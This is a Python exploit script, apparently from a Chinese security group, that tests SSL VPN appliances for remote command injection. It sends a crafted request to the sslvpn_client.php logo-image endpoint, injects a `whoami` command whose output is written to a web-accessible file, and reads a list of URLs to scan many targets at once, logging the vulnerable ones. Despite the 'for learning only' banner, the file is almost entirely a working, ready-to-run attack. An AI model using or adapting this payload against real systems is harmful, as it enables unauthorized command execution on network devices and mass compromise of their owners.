import requests
import argparse
banner='''
-----------------------------
    _              _             
   / \   _ __ ___ (_) ___ __ _   
  / _ \ | '_ ` _ \| |/ __/ _` |  
 / ___ \| | | | | | | (_| (_| |_ 
/_/   \_\_| |_| |_|_|\___\__,_(_)
    +                          此脚本仅用于学习                          +
Author  :   Amica安全攻防
-----------------------------
'''
requests.urllib3.disable_warnings()

def main(url):
    try:
        if 'http' not in url:
            url = 'http://' + url
        payload = "/sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/test.txt|ls HTTP/1.1"
        res = requests.get(url + payload, verify=False, timeout=10)
        shell_url = url + '/sslvpn/test.txt'
        if 'x /tmp|echo `whoami` |tee /usr/local/webui/sslvpn/test.txt|ls' in res.text:
            print(f'[+]存在漏洞: {shell_url}')
            with open('exp2_ok.txt', 'a') as f:
                f.write(shell_url + '\n')
    except requests.exceptions.Timeout as e:
        print(f'[!]连接超时: {e}')
    except Exception as e:
        print(f'[!]漏洞不存在或发生异常: {e}')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="检测URL是否存在漏洞")
    parser.add_argument("-u", "--url", required=False, help="需要检测的URL")
    parser.add_argument("-f", "--file", required=False, help="包含多个URL的文件路径")
    args = parser.parse_args()

    if not (args.file or args.url):
        parser.print_help()
    else:
        urls = [args.url] if args.url else [line.strip() for line in open(args.file, 'r')]
        for url in urls:
            main(url)